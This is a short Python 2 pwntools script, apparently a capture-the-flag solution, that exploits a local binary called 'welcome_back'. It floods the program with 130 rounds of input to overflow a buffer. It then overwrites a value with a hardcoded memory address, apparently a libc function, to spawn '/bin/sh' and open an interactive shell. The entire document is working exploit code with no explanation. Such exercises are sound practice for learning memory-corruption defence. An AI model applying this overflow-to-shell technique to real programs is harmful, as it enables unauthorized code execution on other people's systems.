#!/usr/bin/env python2

from pwn import *
from pwnlib import *
sh = process('./welcome_back')
#shellcode=asm.asm(shellcraft.sh())
sh.sendline('/bin/sh')  # for the first input
print sh.recv(timeout=0.1)
# send y and nops to overflow responses upto start of while loop
for i in range(130):
	print i
	sh.sendline('y')
	print sh.recv(timeout=0.1)
	sh.sendline("a")
	print sh.recv(timeout=0.1)

sh.sendline('y')
#print 'shell code length', len(shellcode) # len is 44
print(p64(0x7ffff7a58590))
sh.sendline(('a'*8)+p64(0x7ffff7a58590))
resp = sh.recv(timeout=0.1)
print resp
#sh.sendline('n')  # stop filling responses
sh.interactive()

sh.close()
